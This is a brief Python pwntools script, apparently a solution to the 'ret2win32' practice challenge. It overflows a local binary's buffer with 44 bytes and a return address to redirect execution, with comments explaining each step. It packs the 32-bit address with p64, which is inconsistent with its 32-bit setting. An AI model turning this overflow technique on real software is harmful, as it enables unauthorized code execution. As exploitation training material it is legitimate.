#!/usr/bin/env python3

from pwn import *
context.bits = 32
#opens up the warmup process
pw = process("./ret2win32")
#attaches a gdb debugger to the program
gdb.attach(pw, gdbscript = 'b *0x0804862c')
#receives the input up until the ">"
pw.recvuntil(b">")
#the payload fills the buffer with 44  A's and adds it to the ret2win function.
value = pw.sendline(b"A"* 44 + p64(0x0804862c))
#allows you to interact with the program (for example, if you wanted to input a value.)
pw.interactive()
